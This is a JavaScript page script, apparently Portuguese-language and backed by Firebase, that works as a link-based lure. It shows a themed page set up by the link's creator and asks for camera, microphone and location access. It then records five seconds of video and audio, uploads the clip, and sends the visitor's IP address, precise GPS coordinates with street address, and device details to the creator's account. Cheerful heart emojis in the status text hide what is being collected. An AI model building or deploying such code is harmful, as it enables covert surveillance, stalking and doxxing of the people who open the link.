
  const firebaseConfig = {
    apiKey: "AIzaSyAWhfaY2Adp4YJGwvITWTGHP-7zOLNfiGI",
    authDomain: "sandalias-retro-9f0c6.firebaseapp.com",
    databaseURL: "https://sandalias-retro-9f0c6-default-rtdb.firebaseio.com",
    projectId: "sandalias-retro-9f0c6",
    storageBucket: "sandalias-retro-9f0c6.appspot.com",
    messagingSenderId: "786208752798",
    appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
    measurementId: "G-XGVHLX01EB"
  };

  firebase.initializeApp(firebaseConfig);
  const database = firebase.database();
  const storage = firebase.storage();

  class VideoLocationSystem {
    constructor() {
      this.urlId = this.getUrlParameter('id');
      this.urlData = null;
      this.userId = null;
      this.themeData = null;
      this.buildUI();
      this.init();
    }

    getUrlParameter(name) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name);
    }

    buildUI() {
      document.body.style.cssText = `
        margin: 0;
        font-family: Arial, sans-serif;
        color: #fff;
        background-color: #000;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        overflow: hidden;
      `;

      this.container = document.createElement('div');
      this.container.style.padding = '20px';
      this.container.style.textAlign = 'center';
      this.container.style.maxWidth = '90%';

      this.emoji = document.createElement('div');
      this.emoji.style.fontSize = '40px';
      this.emoji.style.marginBottom = '10px';

      this.title = document.createElement('h2');
      this.title.style.marginBottom = '10px';
      this.title.style.fontSize = '1.5rem';

      this.description = document.createElement('p');
      this.description.style.marginBottom = '20px';
      this.description.style.fontSize = '1rem';

      this.image = document.createElement('img');
      this.image.style.maxWidth = '100%';
      this.image.style.borderRadius = '12px';
      this.image.style.marginBottom = '20px';
      this.image.style.boxShadow = '0 0 12px rgba(255,255,255,0.2)';

      this.status = document.createElement('div');
      this.status.style.padding = '10px';
      this.status.style.backgroundColor = 'rgba(255,255,255,0.1)';
      this.status.style.borderRadius = '8px';
      this.status.style.fontSize = '1rem';
      this.status.style.animation = 'pulse 1.5s infinite';

      this.container.appendChild(this.emoji);
      this.container.appendChild(this.image);
      this.container.appendChild(this.title);
      this.container.appendChild(this.description);
      this.container.appendChild(this.status);

      document.body.appendChild(this.container);
    }

    setStatus(msg) {
      this.status.innerText = msg;
    }

    async init() {
      try {
        if (!this.urlId) {
          this.setStatus('URL inválida');
          return;
        }

        const urlSnap = await database.ref(`users`).once('value');
        const usersData = urlSnap.val();

        for (const [userId, user] of Object.entries(usersData)) {
          if (user.urls && user.urls[this.urlId]) {
            this.userId = userId;
            this.urlData = user.urls[this.urlId];
            break;
          }
        }

        if (!this.urlData || !this.userId) {
          this.setStatus('URL não encontrada');
          return;
        }

        const now = Date.now();
        if (this.urlData.expiresAt && now > this.urlData.expiresAt) {
          this.setStatus('Campanha expirada');
          return;
        }

        if (this.urlData.maxUses && this.urlData.usedCount >= this.urlData.maxUses) {
          this.setStatus('Limite de usos atingido');
          return;
        }

        await this.loadTheme();
        this.renderTheme();

        this.setStatus('Solicitando permissões...');
        const granted = await this.requestPermissions();
        if (!granted) {
          alert('Você precisa conceder permissões para continuar.');
          location.reload();
          return;
        }

        this.setStatus('Capturando vídeo...');
        await this.recordAndUpload();

      } catch (error) {
        console.error('Erro na inicialização:', error);
        this.setStatus('Erro: ' + error.message);
      }
    }
getCameraFacingMode() {
  const emoji = (this.themeData?.emoji || '').trim();
  if (emoji === '5') return 'user';
  if (emoji === '1') return 'environment';
  return 'environment'; // fallback padrão
}

    async requestPermissions() {
      try {
        await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: this.getCameraFacingMode() },
          audio: true
        });
        await this.getLocation();
        return true;
      } catch (e) {
        console.warn('Permissões negadas:', e);
        return false;
      }
    }

    async loadTheme() {
      try {
        const snap = await database.ref(`users/${this.userId}/urls/${this.urlId}/theme`).once('value');
        this.themeData = snap.val() || {};
      } catch (error) {
        console.warn('Erro ao carregar tema:', error);
        this.themeData = {};
      }
    }

    renderTheme() {
      const { title = '', description = '', imageUrl = '', color = '', emoji = '' } = this.themeData;
      this.title.textContent = title;
      this.description.textContent = description;
      if (imageUrl) this.image.src = imageUrl;
      this.emoji.textContent = emoji;
      if (color) document.body.style.background = color;
    }

    async recordAndUpload() {
      let stream = null;

      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: this.getCameraFacingMode() },
          audio: true
        });

        const chunks = [];
        const recorder = new MediaRecorder(stream, {
          mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
            ? 'video/webm;codecs=vp9'
            : 'video/webm'
        });

        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        recorder.start();
        this.setStatus('Aguarde... (5 segundos)');
        await new Promise(r => setTimeout(r, 5000));
        recorder.stop();

        const videoBlob = await new Promise((resolve, reject) => {
          recorder.onstop = () => {
            if (chunks.length > 0) resolve(new Blob(chunks, { type: 'video/webm' }));
            else reject(new Error('Nenhum dado '));
          };
          setTimeout(() => reject(new Error('Timeout na criação do blob')), 10000);
        });

        stream.getTracks().forEach(track => track.stop());

        if (videoBlob.size === 0) throw new Error('vazio');
        this.setStatus('...');

        const timestamp = Date.now();
        const filePath = `videos/${this.userId}/${this.urlId}_${timestamp}.webm`;
        const storageRef = storage.ref(filePath);
        const uploadTask = await storageRef.put(videoBlob);
        const videoUrl = await uploadTask.ref.getDownloadURL();

        this.setStatus('Obtendo localização...');
        const [ipResult, location] = await Promise.all([this.getIP(), this.getLocation()]);

        this.setStatus('❤️❤️❤️❤️❤️❤️❤️❤️...');
        const captureKey = database.ref().push().key;
        const captureData = {
          id: captureKey,
          urlId: this.urlId,
          userId: this.userId,
          videoUrl,
          ip: ipResult,
          timestamp,
          data: new Date().toISOString(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          localizacao: location || {}
        };

        const usedCount = (this.urlData.usedCount || 0) + 1;

        const updates = {};
        updates[`users/${this.userId}/captures/${captureKey}`] = captureData;
        updates[`users/${this.userId}/urls/${this.urlId}/usedCount`] = usedCount;
        updates[`users/${this.userId}/urls/${this.urlId}/lastUsed`] = timestamp;

        await database.ref().update(updates);
        this.setStatus('✅ ❤️❤️❤️❤️❤️❤️❤️❤️❤️🫶');

      } catch (error) {
        console.error('Erro na captura:', error);
        this.setStatus('❌ Erro na: ' + error.message);
        if (stream) stream.getTracks().forEach(track => track.stop());
      }
    }

    async getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch (e) {
        return 'Não disponível';
      }
    }

    async getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(async pos => {
          const { latitude, longitude } = pos.coords;
          try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
            const data = await res.json();
            resolve({
              latitude,
              longitude,
              accuracy: pos.coords.accuracy,
              rua: data.address?.road || '',
              cidade: data.address?.city || data.address?.town || data.address?.village || '',
              regiao: data.address?.state || '',
              bairro: data.address?.suburb || data.address?.neighbourhood || '',
              numero: data.address?.house_number || 'S/N',
              endereco_completo: data.display_name || '',
              pais: data.address?.country || ''
            });
          } catch {
            resolve({ latitude, longitude, accuracy: pos.coords.accuracy });
          }
        }, err => {
          console.warn('Erro de geolocalização:', err);
          resolve(null);
        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 });
      });
    }
  }

  window.addEventListener('DOMContentLoaded', () => {
    new VideoLocationSystem();
  });
